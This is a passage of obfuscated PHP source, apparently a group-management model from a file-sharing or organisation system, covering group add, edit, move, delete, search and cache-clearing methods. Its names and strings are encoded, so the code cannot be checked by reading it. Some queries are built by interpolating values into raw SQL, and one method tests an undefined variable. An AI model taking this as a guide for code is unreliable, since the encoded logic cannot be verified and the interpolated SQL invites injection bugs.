$Ñ¼²Èà‡[1907] => 0); if (isset($·×ç“‘Ñ[$Ñ¼²Èà‡[1927]])) { $¼Ã–íîá[$Ñ¼²Èà‡[1927]] = $·×ç“‘Ñ[$Ñ¼²Èà‡[1927]]; } else { $íŸã®–İ = $this->max($Ñ¼²Èà‡[1927]); if (!$íŸã®–İ) { $íŸã®–İ = 0; } $¼Ã–íîá[$Ñ¼²Èà‡[1927]] = $íŸã®–İ + 1; } if (!empty($·×ç“‘Ñ[$Ñ¼²Èà‡[1903]])) { $¼Ã–íîá[$Ñ¼²Èà‡[1903]] = $·×ç“‘Ñ[$Ñ¼²Èà‡[1903]]; } $îÔ¾Ñë— = $this->add($¼Ã–íîá); $this->setNamePinyin($îÔ¾Ñë—, $¼Ã–íîá[$Ñ¼²Èà‡[32]]); if (isset($·×ç“‘Ñ[$Ñ¼²Èà‡[1989]])) { $this->metaSet($îÔ¾Ñë—, array($Ñ¼²Èà‡[1989] => $·×ç“‘Ñ[$Ñ¼²Èà‡[1989]], $Ñ¼²Èà‡[1990] => $·×ç“‘Ñ[$Ñ¼²Èà‡[1990]])); unset($·×ç“‘Ñ[$Ñ¼²Èà‡[1989]]); unset($·×ç“‘Ñ[$Ñ¼²Èà‡[1990]]); } Model($Ñ¼²Èà‡[1390])->groupRootAdd($îÔ¾Ñë—); $this->_clearCache($·×ç“‘Ñ[$Ñ¼²Èà‡[180]]); return $îÔ¾Ñë—; } protected function groupEdit($Ê‹½÷œÒ, $ÈÏóÜ„) { $á€Åû‰ =& $_SERVER[íû‘ş´]; $”ïö½‡¹ = $this->getInfoSimple($Ê‹½÷œÒ); if (!$”ïö½‡¹) { return !1; } if (!empty($ÈÏóÜ„[$á€Åû‰[180]])) { $Òø„Ú” = $this->getInfoSimple($ÈÏóÜ„[$á€Åû‰[180]]); if (!$Òø„Ú”) { return !1; } if ($”ïö½‡¹[$á€Åû‰[1903]] == $Òø„Ú”[$á€Åû‰[1903]]) { return !1; } if ($ÈÏóÜ„[$á€Åû‰[180]] != $”ïö½‡¹[$á€Åû‰[180]]) { if ($Òø„Ú”[$á€Åû‰[563]] !== $”ïö½‡¹[$á€Åû‰[563]] && strpos($Òø„Ú”[$á€Åû‰[563]], $”ïö½‡¹[$á€Åû‰[563]] . $”ïö½‡¹[$á€Åû‰[1903]] . $á€Åû‰[50]) === 0) { return !1; } $ÈÏóÜ„[$á€Åû‰[630]] = $Òø„Ú”[$á€Åû‰[563]] . $ÈÏóÜ„[$á€Åû‰[180]] . $á€Åû‰[50]; $this->_changeChildLevel($”ïö½‡¹, $Òø„Ú”); $this->_clearCache($Òø„Ú”[$á€Åû‰[1903]]); $this->_clearCache($”ïö½‡¹[$á€Åû‰[180]]); } } if (isset($ÈÏóÜ„[$á€Åû‰[32]])) { $this->setNamePinyin($Ê‹½÷œÒ, $ÈÏóÜ„[$á€Åû‰[32]]); } if (isset($ÈÏóÜ„[$á€Åû‰[1989]])) { $this->metaSet($Ê‹½÷œÒ, array($á€Åû‰[1989] => $ÈÏóÜ„[$á€Åû‰[1989]], $á€Åû‰[1990] => $ÈÏóÜ„[$á€Åû‰[1990]])); unset($ÈÏóÜ„[$á€Åû‰[1989]]); unset($ÈÏóÜ„[$á€Åû‰[1990]]); } $this->_clearChildrenCache($”ïö½‡¹); return $this->where(array($á€Åû‰[1991] => $Ê‹½÷œÒ))->save($ÈÏóÜ„); } private function _clearChildrenCache($÷¼ °Ç) { $ÁÂÍ÷» =& $_SERVER[íû‘ş´]; $¤–Ëã¼Ù = array($ÁÂÍ÷»[630] => array($ÁÂÍ÷»[590], $÷¼ °Ç[$ÁÂÍ÷»[563]] . $÷¼ °Ç[$ÁÂÍ÷»[1903]] . $ÁÂÍ÷»[591])); $˜ß¼ÓÚô = $this->field($ÁÂÍ÷»[1903])->where($¤–Ëã¼Ù)->select(); foreach ($˜ß¼ÓÚô as $´¦»Ê‘) { $this->_clearCache($´¦»Ê‘[$ÁÂÍ÷»[1903]]); } } private function _clearCache($³ÒŸÏøì) { $éı·Œ¹Ù =& $_SERVER[íû‘ş´]; $this->cacheFunctionClear($éı·Œ¹Ù[1985], $³ÒŸÏøì); $this->cacheFunctionClear($éı·Œ¹Ù[1986], $³ÒŸÏøì); } private function _changeChildLevel($ğ’ÜØšÒ, $·ËÏ”Èô, $©½ò ¦ = false) { $¤Âîšó“ =& $_SERVER[íû‘ş´]; $İ’²¦¢€ = $ğ’ÜØšÒ[$¤Âîšó“[563]] . $ğ’ÜØšÒ[$¤Âîšó“[1903]] . $¤Âîšó“[50]; $åÀô·È = $·ËÏ”Èô[$¤Âîšó“[563]] . $·ËÏ”Èô[$¤Âîšó“[1903]] . $¤Âîšó“[50] . $ğ’ÜØšÒ[$¤Âîšó“[1903]] . $¤Âîšó“[50]; if ($©½ò ¦) { $åÀô·È = $·ËÏ”Èô[$¤Âîšó“[563]] . $·ËÏ”Èô[$¤Âîšó“[1903]] . $¤Âîšó“[50]; } $ò’Ÿ¢ó = array($¤Âîšó“[630] => array($¤Âîšó“[590], $ğ’ÜØšÒ[$¤Âîšó“[563]] . $ğ’ÜØšÒ[$¤Âîšó“[1903]] . $¤Âîšó“[591])); $îÂ¡ãì = array($¤Âîšó“[630] => array($¤Âîšó“[639], "\162\x65\x70\154\141\x63\x65\x28\x70\141\162\145\x6e\164\x4c\x65\166\x65\154\x2c\47{$İ’²¦¢€}\x27\x2c\x27{$åÀô·È}\x27\51")); $this->_clearChildrenCache($ğ’ÜØšÒ); $this->where($ò’Ÿ¢ó)->data($îÂ¡ãì)->save(); } public function setNamePinyin($åğÒò¼İ, $öçöØ™ = false) { $¥ÂıÅµÃ =& $_SERVER[íû‘ş´]; if (!$öçöØ™) { $Â“¼»Şå = $this->getInfoSimple($åğÒò¼İ); $öçöØ™ = $Â“¼»Şå[$¥ÂıÅµÃ[32]]; } if (!Input::check($öçöØ™, $¥ÂıÅµÃ[633])) { $this->metaSet($åğÒò¼İ, $¥ÂıÅµÃ[515], null); $this->metaSet($åğÒò¼İ, $¥ÂıÅµÃ[514], null); return; } $š½£–—Ü = array($¥ÂıÅµÃ[515] => str_replace($¥ÂıÅµÃ[53], $¥ÂıÅµÃ[12], Pinyin::get($öçöØ™)), $¥ÂıÅµÃ[514] => Pinyin::get($öçöØ™, $¥ÂıÅµÃ[634])); $this->metaSet($åğÒò¼İ, $š½£–—Ü); } protected function groupStatus($ø¿–Ö‚Ã, $ÓèÂàíß) { $üÇö˜º” =& $_SERVER[íû‘ş´]; $‚îı† = $this->getInfoSimple($ø¿–Ö‚Ã); if (!$‚îı†) { return !1; } if ($ÓèÂàíß == $üÇö˜º”[88]) { $é…Àİïñ = $this->parentLevelArray($‚îı†[$üÇö˜º”[563]]); } else { $Â€ëµÆ = array($üÇö˜º”[630] => array($üÇö˜º”[590], $‚îı†[$üÇö˜º”[563]] . $‚îı†[$üÇö˜º”[1903]] . $üÇö˜º”[591])); $é…Àİïñ = $this->where($Â€ëµÆ)->field($üÇö˜º”[1903])->select(); $é…Àİïñ = array_to_keyvalue($é…Àİïñ, $üÇö˜º”[12], $üÇö˜º”[1903]); } $é…Àİïñ[] = $‚îı†[$üÇö˜º”[1903]]; $øæôƒ“ = array(); foreach ($é…Àİïñ as $ø¿–Ö‚Ã) { $øæôƒ“[] = array($üÇö˜º”[1903] => $ø¿–Ö‚Ã, $üÇö˜º”[94] => $üÇö˜º”[809], $üÇö˜º”[418] => $ÓèÂàíß); $this->_clearCache($ø¿–Ö‚Ã); } return Model($üÇö˜º”[1992])->addAll($øæôƒ“, array(), !0); } protected function groupRemove($•û±Ä ˜, $‘ñ˜Ü¹§ = false) { $íĞá¿ı =& $_SERVER[íû‘ş´]; $çşùøøë = array($íĞá¿ı[1903] => $•û±Ä ˜); $ğ›Š£šÒ = $this->where($çşùøøë)->find(); if (!$ğ›Š£šÒ || $ğ›Š£šÒ[$íĞá¿ı[180]] == 0) { return !1; } if (!$‘ñ˜Ü¹§) { $Œ¥ş÷Ø = $this->getInfoSimple($ğ›Š£šÒ[$íĞá¿ı[180]]); $this->_changeChildLevel($ğ›Š£šÒ, $Œ¥ş÷Ø, !0); $this->where(array($íĞá¿ı[180] => $•û±Ä ˜))->save(array($íĞá¿ı[180] => $ğ›Š£šÒ[$íĞá¿ı[180]])); $this->_clearCache($Œ¥ş÷Ø[$íĞá¿ı[1903]]); } Model($íĞá¿ı[1992])->where($çşùøøë)->delete(); Model($íĞá¿ı[1993])->where($çşùøøë)->delete(); Model($íĞá¿ı[884])->groupRootRemove($•û±Ä ˜); $this->_clearCache($ğ›Š£šÒ[$íĞá¿ı[180]]); return $this->where($çşùøøë)->delete(); } protected function groupSort($…²§øàÕ) { $¯òœâÈ =& $_SERVER[íû‘ş´]; $ÙÕô = array(); foreach ($…²§øàÕ as $šÉùşÙå => $ÌÜª¤¹¢) { $ÙÕô[] = array($¯òœâÈ[1903], $ÌÜª¤¹¢, $¯òœâÈ[1927], $šÉùşÙå + 1); } $this->saveAll($ÙÕô); } public function listData() { $à‹—ÒèÉ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($à‹—ÒèÉ[$_SERVER[íû‘ş´][413]]); return $à‹—ÒèÉ; } private function _makeOrder($™—°ƒ¯© = '') { $ÓÈÔç¥™ =& $_SERVER[íû‘ş´]; $Ä¿¶ù¤ï = array($ÓÈÔç¥™[1903], $ÓÈÔç¥™[32], $ÓÈÔç¥™[1892], $ÓÈÔç¥™[215]); $õñ»Ôµ = array($ÓÈÔç¥™[500] => $ÓÈÔç¥™[501], $ÓÈÔç¥™[502] => $ÓÈÔç¥™[503]); $Œ–´Ô”Å = Input::get($ÓÈÔç¥™[507], $ÓÈÔç¥™[7], $ÓÈÔç¥™[1907], $Ä¿¶ù¤ï); $Á¾ŒĞƒÑ = Input::get($ÓÈÔç¥™[508], $ÓÈÔç¥™[7], $ÓÈÔç¥™[1994], array($ÓÈÔç¥™[1994], $ÓÈÔç¥™[502])); $Á¾ŒĞƒÑ = $õñ»Ôµ[$Á¾ŒĞƒÑ]; $™—°ƒ¯© = $™—°ƒ¯© . "{$Œ–´Ô”Å}\x20{$Á¾ŒĞƒÑ}\54\x20\147\162\157\x75\160\111\x44\40\141\x73\143"; return $this->order($™—°ƒ¯©); } public function listChild($øû–íß•) { $ö›ÖÃ¨€ =& $_SERVER[íû‘ş´]; $‹±ëğø = $this->where(array($ö›ÖÃ¨€[180] => $øû–íß•))->_makeOrder()->selectPage(200); $this->_listDataApply($‹±ëğø[$ö›ÖÃ¨€[413]]); return $‹±ëğø; } public function listChildIds($Ò¤ÏÇîõ) { $ÈîË‘‹¸ =& $_SERVER[íû‘ş´]; if (is_string($ÀîÓà˜ï)) { $Ò¤ÏÇîõ = explode($ÈîË‘‹¸[50], $Ò¤ÏÇîõ); } $ÈÏÁë† = $this->where(array($ÈîË‘‹¸[1903] => array($ÈîË‘‹¸[7], $Ò¤ÏÇîõ)))->field($ÈîË‘‹¸[1995])->select(); if (!$ÈÏÁë†) { return !1; } $ŠÕú—»« = array(); foreach ($ÈÏÁë† as $Äù©¹) { $ŠÕú—»«[] = "\x73\x65\x6c\x65\x63\164\40\147\x72\x6f\x75\160\x49\104\x20\146\162\157\x6d\40\x60\x67\162\157\165\x70\140\x20\167\150\145\x72\145\x20\160\141\x72\145\156\x74\x4c\145\166\x65\x6c\40\x6c\151\153\145\x20\47{$Äù©¹[$ÈîË‘‹¸[563]]}{$Äù©¹[$ÈîË‘‹¸[1903]]}\54\x25\x27"; } $ŠÕú—»« = implode($ÈîË‘‹¸[1996], $ŠÕú—»«); $ÈÏÁë† = $this->query($ŠÕú—»«); if (!$ÈÏÁë†) { return array(); } $Ò¤ÏÇîõ = array_to_keyvalue($ÈÏÁë†, $ÈîË‘‹¸[12], $ÈîË‘‹¸[1903]); return array_unique($Ò¤ÏÇîõ); } public function listByID($öÕ•éñá) { $Ë‚ÑæÙø =& $_SERVER[íû‘ş´]; if (!$öÕ•éñá) { return array(); } $ö ”ñÄ™ = array($Ë‚ÑæÙø[1903] => array($Ë‚ÑæÙø[7], $öÕ•éñá)); $¸ä±«»¼ = $this->where($ö ”ñÄ™)->select(); $¸ä±«»¼ = array_sort_keep($¸ä±«»¼, $Ë‚ÑæÙø[1903], $öÕ•éñá); $this->_listDataApply($¸ä±«»¼); return $¸ä±«»¼; } public function listSearch($Áâ§€ä¨) { $Ë×¡¼î× =& $_SERVER[íû‘ş´]; $˜ö üåµ = $Áâ§€ä¨[$Ë×¡¼î×[1997]]; $ó‰úùç„ = isset($Áâ§€ä¨[$Ë×¡¼î×[1998]]) ? $Áâ§€ä¨[$Ë×¡¼î×[1998]] : !1; if (!trim($˜ö üåµ)) { return !1; } $˜ö üåµ = str_replace($Ë×¡¼î×[1999], $Ë×¡¼î×[2000], $˜ö üåµ); $‚“óº¢â = array($Ë×¡¼î×[1903] => array($Ë×¡¼î×[427], "{$˜ö üåµ}\45"), $Ë×¡¼î×[32] => array($Ë×¡¼î×[427], "\x25{$˜ö üåµ}\x25"), $Ë×¡¼î×[1058] => $Ë×¡¼î×[2001]); if ($ó‰úùç„) { $Á…ªÖ‘… = $this->getInfoSimple($ó‰úùç„); $¯´¨±¨€ = $Á…ªÖ‘…[$Ë×¡¼î×[563]] . $ó‰úùç„ . $Ë×¡¼î×[591]; $‚“óº¢â = array($‚“óº¢â, array($Ë×¡¼î×[563] => array($Ë×¡¼î×[427], $¯´¨±¨€))); } $‚“óº¢â = $this->parseWhereLike($‚“óº¢â); $üçòãÂú = $this->_makeOrder()->where($‚“óº¢â)->selectPage(20); $üçòãÂú = $üçòãÂú ? $üçòãÂú : array($Ë×¡¼î×[413] => array(), $Ë×¡¼î×[410] => array()); if (!$üçòãÂú || count($üçòãÂú[$Ë×¡¼î×[413]]) < 5 && Input::check($˜ö üåµ, $Ë×¡¼î×[362])) { $Æ‘Ñ·¡ = $this->groupChildrenAll($ó‰úùç„); $óÆä­ö… = $this->_searchFromMeta($Ë×¡¼î×[514], $˜ö üåµ, 10, $Æ‘Ñ·¡); $ÒîŞ’÷Ã = $this->_searchFromMeta($Ë×¡¼î×[515], $˜ö üåµ, 10, $Æ‘Ñ·¡); $å°äÚ® = array_merge($óÆä­ö…, $ÒîŞ’÷Ã, $üçòãÂú[$Ë×¡¼î×[413]]); $üçòãÂú[$Ë×¡¼î×[413]] = array_unique_by_key($å°äÚ®, $Ë×¡¼î×[1903]); $üçòãÂú[$Ë×¡¼î×[410]][$Ë×¡¼î×[411]] = count($üçòãÂú[$Ë×¡¼î×[413]]); $üçòãÂú[$Ë×¡¼î×[410]][$Ë×¡¼î×[412]] = ceil($üçòãÂú[$Ë×¡¼î×[410]][$Ë×¡¼î×[411]] / $üçòãÂú[$Ë×¡¼î×[410]][$Ë×¡¼î×[407]]); } $this->_listDataApply($üçòãÂú[$Ë×¡¼î×[413]]); return $üçòãÂú; } protected function groupChildrenAll($–»ÏÖ½¢) { $Ï˜ƒ÷¶ =& $_SERVER[íû‘ş´]; if (!$–»ÏÖ½¢) { return !1; } if (!is_array($–»ÏÖ½¢)) { $–»ÏÖ½¢ = array($–»ÏÖ½¢); } $”ˆ ùÚÍ = $–»ÏÖ½¢; foreach ($–»ÏÖ½¢ as $àç–£¯¡) { $öØ÷ŠĞó = $this->getInfoSimple($àç–£¯¡); $òÍîÚ à = array($Ï˜ƒ÷¶[563] => array($Ï˜ƒ÷¶[427], $öØ÷ŠĞó[$Ï˜ƒ÷¶[563]] . $àç–£¯¡ . $Ï˜ƒ÷¶[591])); $ÔÙÊä = $this->field($Ï˜ƒ÷¶[1903])->where($òÍîÚ à)->select(); $”ˆ ùÚÍ = array_merge($”ˆ ùÚÍ, array_to_keyvalue($ÔÙÊä, $Ï˜ƒ÷¶[12], $Ï˜ƒ÷¶[1903])); } return array_unique($”ˆ ùÚÍ); } private function _searchFromMeta($«Š©Á÷±, $Ô©ĞŒ“¤, $÷ÎäÌşÄ, $ÛËš¥¼) { $Íğà¥Ö§ =& $_SERVER[íû‘ş´]; $Ô©ĞŒ“¤ = strtolower($Ô©ĞŒ“¤); $÷Å¸àç· = array($Íğà¥Ö§[94] => $«Š©Á÷±, $Íğà¥Ö§[418] => array($Íğà¥Ö§[427], "\x25{$Ô©ĞŒ“¤}\45")); $÷Å¸àç· = $this->parseWhereLike($÷Å¸àç·); if ($ÛËš¥¼) { $÷Å¸àç·[$Íğà¥Ö§[1903]] = array($Íğà¥Ö§[7], $ÛËš¥¼); } $±™ÁÑß = Model($Íğà¥Ö§[2002])->where($÷Å¸àç·)->limit($÷ÎäÌşÄ)->select(); if (!$±™ÁÑß) { return array(); } $±™ÁÑß = array_to_keyvalue($±™ÁÑß, $Íğà¥Ö§[12], $Íğà¥Ö§[1903]); $ğÕÉêÍÊ = $this->where(array($Íğà¥Ö§[1991] => array($Íğà¥Ö§[7], $±™ÁÑß)))->select(); if (!$ğÕÉêÍÊ) { return array(); } return $ğÕÉêÍÊ; } protected function _listDataApplyItem($¹ÙÒ€ö) { $ù×öë° = array($¹ÙÒ€ö); $this->_listDataApply($ù×öë°); return $ù×öë°[0]; } protected function _listDataApply(&$Şœ‰ı¬ğ) { $²«’Ì«Á =& $_SERVER[íû‘ş´]; if (!$Şœ‰ı¬ğ) { return; } $†ëßÎ›» = array_to_keyvalue($Şœ‰ı¬ğ, $²«’Ì«Á[12], $²«’Ì«Á[1903]); $this->_listAppendChildren($Şœ‰ı¬ğ); $this->_listAppendChildrenMember($Şœ‰ı¬ğ); $this->_listAppendMeta($Şœ‰ı¬ğ, $†ëßÎ›»); $this->_listAppendParent($Şœ‰ı¬ğ); $this->_listAppendSourceRoot($Şœ‰ı¬ğ, $†ëßÎ›»); } private function _listAppendChildren(&$–Îñ³¸Û) { $à‡ÎõªÒ =& $_SERVER[íû‘ş´]; $³³Á¤ğÓ = array_to_keyvalue($–Îñ³¸Û, $à‡ÎõªÒ[12], $à‡ÎõªÒ[1903]); $øÉü–²® = array($à‡ÎõªÒ[180] => array($à‡ÎõªÒ[7], $³³Á¤ğÓ)); $İÑœÃÅ­ = array($à‡ÎõªÒ[180], $à‡ÎõªÒ[2003] => $à‡ÎõªÒ[543]); $–ãº€Äß = $this->field($İÑœÃÅ­)->where($øÉü–²®)->group($à‡ÎõªÒ[180])->select(); $îÚ¾Ò£ = array_to_keyvalue($–ãº€Äß, $à‡ÎõªÒ[180], $à‡ÎõªÒ[543]); foreach ($–Îñ³¸Û as &$²—†âı) { $Ğá‘Åİç = $²—†âı[$à‡ÎõªÒ[1903]]; $²—†âı[$à‡ÎõªÒ[2004]] = isset($îÚ¾Ò£[$Ğá‘Åİç]) ? intval($îÚ¾Ò£[$Ğá‘Åİç]) : !1; } unset($²—†âı); } private function _listAppendChildrenMember(&$õ“Ù±âß) { $­ì³›Ğñ =& $_SERVER[íû‘ş´]; $²ßó„‰¨ = array_to_keyvalue($õ“Ù±âß, $­ì³›Ğñ[12], $­ì³›Ğñ[1903]); $ïº†¬ÈÙ = array($­ì³›Ğñ[1903] => array($­ì³›Ğñ[7], $²ßó„‰¨)); $íçíÑş¡ = array($­ì³›Ğñ[1903], $­ì³›Ğñ[2003] => $­ì³›Ğñ[543]); $ß¯ÌÄˆ = Model($­ì³›Ğñ[1993])->field($íçíÑş¡)->where($ïº†¬ÈÙ)->group($­ì³›Ğñ[1903])->select(); $µì­Ñáù = array_to_keyvalue($ß¯ÌÄˆ, $­ì³›Ğñ[1903], $­ì³›Ğñ[543]); foreach ($õ“Ù±âß as &$®ò‡İ¹) { $‹ò¥Äúª = $®ò‡İ¹[$­ì³›Ğñ[1903]]; $®ò‡İ¹[$­ì³›Ğñ[2005]] = isset($µì­Ñáù[$‹ò¥Äúª]) ? intval($µì­Ñáù[$‹ò¥Äúª]) : !1; } unset($®ò‡İ¹); } private function _listAppendMeta(&$×ÉÃ£ß, $ñ­—¶Û¿) { $øÍôï“ =& $_SERVER[íû‘ş´]; $ÓÙßêê = array($øÍôï“[1903] => array($øÍôï“[7], $ñ­—¶Û¿)); $¯›ÌÅŠÎ = Model($øÍôï“[1992])->where($ÓÙßêê)->select(); $¯›ÌÅŠÎ = array_to_keyvalue_group($¯›ÌÅŠÎ, $øÍôï“[1903]); foreach ($¯›ÌÅŠÎ as &$ƒÕİˆıÇ) { $ƒÕİˆıÇ = array_to_keyvalue($ƒÕİˆıÇ, $øÍôï“[94], $øÍôï“[418]); } unset($ƒÕİˆıÇ); foreach ($×ÉÃ£ß as &$´ÑÚúÌ) { $´ÑÚúÌ[$øÍôï“[516]] = array(); if (isset($¯›ÌÅŠÎ[$´ÑÚúÌ[$øÍôï“[1903]]])) { $´ÑÚúÌ[$øÍôï“[516]] = $¯›ÌÅŠÎ[$´ÑÚúÌ[$øÍôï“[1903]]]; } } unset($´ÑÚúÌ); } protected function parentLevelArray($½‹éÛäè) { $éŠÕÄ =& $_SERVER[íû‘ş´]; $½‹éÛäè = explode($éŠÕÄ[50], trim($½‹éÛäè, $éŠÕÄ[50])); $½‹éÛäè = array_remove_value($½‹éÛäè, $éŠÕÄ[212]); return $½‹éÛäè; } protected function parentInGroup($¿éüÁí, $®’‡ÕÜİ) { $íì–Á¹ê =& $_SERVER[íû‘ş´]; $°›©ºÁ = $this->getInfoSimple($¿éüÁí); if (!$°›©ºÁ) { return !0; } $±¦Œ´£¿ = $this->parentLevelArray($°›©ºÁ[$íì–Á¹ê[563]]); $±¦Œ´£¿[] = $¿éüÁí; foreach ($±¦Œ´£¿ as $¿éüÁí) { if (in_array($¿éüÁí . $íì–Á¹ê[12], $®’‡ÕÜİ)) { return !0; } } return !1; } private function _listAppendParent(&$œœÓù›) { $Êòé›æÙ =& $_SERVER[íû‘ş´]; $‘Ÿæªœ¥ = array(); foreach ($œœÓù› as &$›¡ËãŞ) { $‘Ÿæªœ¥[$›¡ËãŞ[$Êòé›æÙ[1903]]] = $›¡ËãŞ[$Êòé›æÙ[32]]; $ÏÂ¶’ÑÕ = $this->parentLevelArray($›¡ËãŞ[$Êòé›æÙ[563]]); foreach ($ÏÂ¶’ÑÕ as $â™äŸêÙ) { if (!isset($‘Ÿæªœ¥[$â™äŸêÙ])) { $‘Ÿæªœ¥[$â™äŸêÙ] = 0; } } } unset($›¡ËãŞ); foreach ($‘Ÿæªœ¥ as $Çš¾ÂÓ³ => $¦¤×•»ƒ) { if ($¦¤×•»ƒ) { continue; } $ĞŒ€şØ‡ = $this->getInfoSimple($Çš¾ÂÓ³); $‘Ÿæªœ¥[$Çš¾ÂÓ³] = $ĞŒ€şØ‡[$Êòé›æÙ[32]]; } $ŞèƒÅõ¡ = $GLOBALS[$Êòé›æÙ[6]][$Êòé›æÙ[89]][$Êòé›æÙ[2006]]; if ($GLOBALS[$Êòé›æÙ[546]] == $Êòé›æÙ[88]) { $ŞèƒÅõ¡ = !1; } foreach ($œœÓù› as &$›¡ËãŞ) { $ÏÂ¶’ÑÕ = $this->parentLevelArray($›¡ËãŞ[$Êòé›æÙ[563]]); $‹ÖÀ…­¾ = $Êòé›æÙ[12]; foreach ($ÏÂ¶’ÑÕ as $Çš¾ÂÓ³ => $â™äŸêÙ) { if ($ŞèƒÅõ¡ && $Çš¾ÂÓ³ == 0) { continue; } $‹ÖÀ…­¾ .= $‘Ÿæªœ¥[$â™äŸêÙ] . $Êòé›æÙ[8]; } if ($ÏÂ¶’ÑÕ) { $‹ÖÀ…­¾ .= $›¡ËãŞ[$Êòé›æÙ[32]]; } $›¡ËãŞ[$Êòé›æÙ[568]] = str_replace($Êòé›æÙ[571], $Êòé›æÙ[8], $‹ÖÀ…­¾); } unset($›¡ËãŞ); } private function _listAppendSourceRoot(&$©Ï , $‹‰¡Úµí) { $¯Ù§É¡Ù =& $_SERVER[íû‘ş´]; $»İ£û’ı = Model($¯Ù§É¡Ù[884])->listSourceRoot(SourceModel::TYPE_GROUP, $‹‰¡Úµí); $»İ£û’ı = array_to_keyvalue($»İ£û’ı, $¯Ù§É¡Ù[548]); $»İ£û’ı = array_remove_key($»İ£û’ı, $¯Ù§É¡Ù[548]); foreach ($©Ï  as &$ÓÏ‚ĞÇä) { $ÓÏ‚ĞÇä[$¯Ù§É¡Ù[87]] = $»İ£û’ı[$ÓÏ‚ĞÇä[$¯Ù§É¡Ù[1903]]] ? $»İ£û’ı[$ÓÏ‚ĞÇä[$¯Ù§É¡Ù[1903]]] : array(); } unset($ÓÏ‚ĞÇä); } protected function groupMerge($É•¤ã) { $É•¤ã = array_values(array_unique($É•¤ã)); $¡•©Êİ = array(); for ($ûµíÈ©µ = 0; $ûµíÈ©µ < count($É•¤ã); $ûµíÈ©µ++) { $œÔ—şß¯ = !1; for ($íö¡®şÏ = 0; $íö¡®şÏ < count($É•¤ã); $íö¡®şÏ++) { if ($ûµíÈ©µ == $íö¡®şÏ) { continue; } if ($this->isParentOf($É•¤ã[$íö¡®şÏ], $É•¤ã[$ûµíÈ©µ])) { $œÔ—şß¯ = !0; break; } } if (!$œÔ—şß¯) { $¡•©Êİ[] = $É•¤ã[$ûµíÈ©µ]; } } return $¡•©Êİ; } protected function isParentOf($š¨ˆêµ†, $æŸ‡€€“) { $€ñ½•ìı =& $_SERVER[íû‘ş´]; if (!$š¨ˆêµ† || !$æŸ‡€€“ || $š¨ˆêµ† == $æŸ‡€€“) { return !1; } $£Ê¼¤«‰ = $this->getInfoSimple($š¨ˆêµ†); $ŸØ–Ê¤í = $this->getInfoSimple($æŸ‡€€“); $”˜¨‹«® = $£Ê¼¤«‰[$€ñ½•ìı[563]] . $š¨ˆêµ† . $€ñ½•ìı[50]; if (substr($ŸØ–Ê¤í[$€ñ½•ìı[563]], 0, strlen($”˜¨‹«®)) == $”˜¨‹«®) { return !0; } return !1; } public function groupShowRoot($‹Æ¢«–Ú, $ò«ò–Ö = false) { $½»Ë¨¿ =& $_SERVER[íû‘ş´]; $øş‰™à = $this->getInfo($‹Æ¢«–Ú); if (!$øş‰™à) { return array(); } $Êã„Âá† = $this->parentLevelArray($øş‰™à[$½»Ë¨¿[563]]); $Ì˜çÑĞù = array($‹Æ¢«–Ú); if (count($Êã„Âá†) == 0) { return $Ì˜çÑĞù; } if ($ò«ò–Ö && count($Êã„Âá†) == 1) { return $Ì˜çÑĞù; } if (!$øş‰™à[$½»Ë¨¿[516]] || !isset($øş‰™à[$½»Ë¨¿[516]][$½»Ë¨¿[1989]]) || $øş‰™à[$½»Ë¨¿[516]][$½»Ë¨¿[1989]] == $½»Ë¨¿[1958]) { return $this->groupShowRoot($Êã„Âá†[count($Êã„Âá†) - 1], $ò«ò–Ö); } if ($øş‰™à[$½»Ë¨¿[516]][$½»Ë¨¿[1989]] == $½»Ë¨¿[401]) { $î’¶Ÿš = explode($½»Ë¨¿[50], $øş‰™à[$½»Ë¨¿[516]][$½»Ë¨¿[1990]]); if ($î’¶Ÿš) { $Ì˜çÑĞù = array_merge($Ì˜çÑĞù, $î’¶Ÿš); } } return $Ì˜çÑĞù; } protected function resetParentLevel() { $Š™ğ¥© =& $_SERVER[íû‘ş´]; $Î¸ÁÕœ = $Š™ğ¥©[1903]; $Åıœ‚¸¾ = $this->select(); $Åıœ‚¸¾ = array_to_keyvalue($Åıœ‚¸¾, $Î¸ÁÕœ); foreach ($Åıœ‚¸¾ as $õ°¾Õ•) { $Ì”Ñ§šÚ = $õ°¾Õ•; $İáÆ–¬º = array(); while ($Ì”Ñ§šÚ[$Š™ğ¥©[180]] != 0) { $İáÆ–¬º[] = $Ì”Ñ§šÚ[$Š™ğ¥©[180]]; $Ì”Ñ§šÚ = $Åıœ‚¸¾[$Ì”Ñ§šÚ[$Š™ğ¥©[180]]]; } $İáÆ–¬º[] = 0; $İáÆ–¬º = $Š™ğ¥©[50] . implode($Š™ğ¥©[50], array_reverse($İáÆ–¬º)) . $Š™ğ¥©[50]; $this->setNamePinyin($õ°¾Õ•[$Î¸ÁÕœ], $õ°¾Õ•[$Š™ğ¥©[32]]); $this->where(array($Î¸ÁÕœ => $õ°¾Õ•[$Î¸ÁÕœ]))->save(array($Š™ğ¥©[630] => $İáÆ–¬º)); } return $Åıœ‚¸¾; } public function groupNameAuto($…´¡üĞª, $€ê×°‚) { $‰¯ššƒ =& $_SERVER[íû‘ş´]; $¨«“ñË— = $this->where(array($‰¯ššƒ[454] => $…´¡üĞª))->getField($‰¯ššƒ[32], !0); if (!$¨«“ñË— || !in_array($€ê×°‚, $¨«“ñË—)) { return $€ê×°‚; } for ($ûŸ¾ÄÆç = 1; $ûŸ¾ÄÆç <= count($¨«“ñË—) + 1; $ûŸ¾ÄÆç++) { $ø×—àÍæ = $€ê×°‚ . "\50{$ûŸ¾ÄÆç}\x29"; if (!in_array($ø×—àÍæ, $¨«“ñË—)) { return $ø×—àÍæ; } } } public function groupSwitch($Òù©İˆƒ, $­ÇæšğÜ) { $ˆ¿ìİŞÄ =& $_SERVER[íû‘ş´]; $Êü˜¸ô“ = array($ˆ¿ìİŞÄ[1903] => array($ˆ¿ìİŞÄ[7], array($Òù©İˆƒ, $­ÇæšğÜ))); $ğËŒ€¯‰ = $this->where($Êü˜¸ô“)->select(); $ğËŒ€¯‰ = array_to_keyvalue($ğËŒ€¯‰, $ˆ¿ìİŞÄ[1903]); if (!isset($ğËŒ€¯‰[$Òù©İˆƒ]) || !isset($ğËŒ€¯‰[$­ÇæšğÜ]) || $ğËŒ€¯‰[$Òù©İˆƒ][$ˆ¿ìİŞÄ[180]] == 0) { return !1; } $Êü˜¸ô“ = array($ˆ¿ìİŞÄ[1903] => $Òù©İˆƒ); $İşíôÃò = Model($ˆ¿ìİŞÄ[1993])->where($Êü˜¸ô“)->select(); if (!$İşíôÃò) { $İşíôÃò = array(); } foreach ($İşíôÃò as 